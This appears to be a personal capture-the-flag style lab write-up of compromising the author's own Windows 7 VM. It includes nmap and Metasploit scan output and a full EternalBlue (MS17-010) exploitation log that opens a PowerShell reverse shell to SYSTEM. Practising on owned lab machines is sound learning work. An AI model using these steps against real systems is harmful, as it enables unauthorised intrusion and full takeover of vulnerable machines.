## Box: [Blue] — Started: 2025-10-14 21:10

**IP/Host:** Local VM, `MAC: 00:0c:29:21:0B:A3`  |  **Status:** `owned - 2025-10-14 23:27`

current session IP:
192.168.109.130
### TL;DR

Initial: `how in`. PrivEsc: `how root`.

**Key Takeaways**:
The first time I ran this exploit (not pictured here), it actually crashed the network connection. The login screen to the machine still looked functional, but ping no longer located the machine and I wasn't able to run the exploit anymore because the box wasn't findable.

*This is good to note*: RCE exploits can disable key functionality or bring down a machine entirely. When dealing with Key infrastructure, **USE CAUTION** and get perms first, otherwise you could end up harming someone

*Cumulative Impact Overview*:
- RCE
- `nt authority/system` user access

### Exploit Lifecycle

1. *Validation & Recon*: Local VM, personally owned machine -> valid to exploit
2. *Enumeration & Scanning*:

- `nmap -sV 192.168.109.130`
```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
```

**NOTE**: SMB possibly vulnerable. Checking...

- NMAP scripts first: `nmap -sC -p 445 192.168.109.130`
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 21:24 EDT
Nmap scan report for 192.168.109.130
Host is up (0.00020s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:21:0B:A3 (VMware)

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-15T01:24:06
|_  start_date: 2025-10-15T03:07:26
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:21:0b:a3 (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-14T21:24:06-04:00
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
```
- Potentially SMB v2, let's validate in Metasploit


- Metasploit SMB Version scanner:
```bash
msf auxiliary(scanner/smb/smb_version) > run
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.109.130:445   - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:) (guid:{048d4194-ec4a-43ba-b0ea-e937d89721f3}) (authentication domain:WIN-845Q99OO4PP)
[+] 192.168.109.130:445   -   Host is running Windows 7  Ultimate  SP1  (build:7601)
[*] 192.168.109.130       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/smb/smb_version) > 
```

- Preferred dialect: SMB 2.1
    - Lets look for vulnerabilities for Win7 using smb2.1


3. *Findings & Exploits*:
    - EternalBlue: https://www.exploit-db.com/exploits/42315
        - Module: `exploit/windows/smb/ms17_010_eternalblue` w/ payload `windows/x64/powershell_reverse_tcp` -> SUCCEEDS to `root`
4. *PrivEsc*:
    - No privesc needed, exploit drops you into root shell

5. *Proof — path to flags/screenshot of boxpwn*:

- Setup:
    - SMBDomain -> `ADMIN$`
    - payload -> `windows/x64/powershell_reverse_tcp`

```powershell
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.109.128:4444 
[*] 192.168.109.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.109.130:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.109.130:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.109.130:445 - The target is vulnerable.
[*] 192.168.109.130:445 - Connecting to target for exploitation.
[+] 192.168.109.130:445 - Connection established for exploitation.
[+] 192.168.109.130:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.109.130:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.109.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.109.130:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.109.130:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.109.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.109.130:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.109.130:445 - Sending all but last fragment of exploit packet
[*] 192.168.109.130:445 - Starting non-paged pool grooming
[+] 192.168.109.130:445 - Sending SMBv2 buffers
[+] 192.168.109.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.109.130:445 - Sending final SMBv2 buffers.
[*] 192.168.109.130:445 - Sending last fragment of exploit packet!
[*] 192.168.109.130:445 - Receiving response from exploit packet
[+] 192.168.109.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.109.130:445 - Sending egg to corrupted connection.
[*] 192.168.109.130:445 - Triggering free of corrupted buffer.
[*] Powershell session session 1 opened (192.168.109.128:4444 -> 192.168.109.130:49158) at 2025-10-14 22:36:01 -0400
[+] 192.168.109.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.109.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.109.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

PS C:\Windows\system32> whoami
nt authority\system

```
### Findings

- **CONFIRMED** *- Found*: PORT 139/445 - 192.168.109.130 - 2025-10-14 21:51:35 - SMB 2.1 on Win7 client vulnerable to eternal blue. Allows for remote code execution, and payload `exploit/windows/smb/ms17_010_eternalblue` provides immediate access to root-level user, 

### Full shell log of successful session
```bash
msf payload(windows/powershell_reverse_tcp) > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/powershell_reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.109.130  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                             asploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2,
                                             Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 target machines.


Payload options (windows/x64/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   EXITFUNC      thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST         192.168.109.128  yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set SMBDomain ADMIN$
SMBDomain => ADMIN$
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.109.130  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                             asploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain      ADMIN$           no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2,
                                             Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 target machines.


Payload options (windows/x64/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   EXITFUNC      thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST         192.168.109.128  yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > check
[*] 192.168.109.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.109.130:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.109.130:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.109.130:445 - The target is vulnerable.
```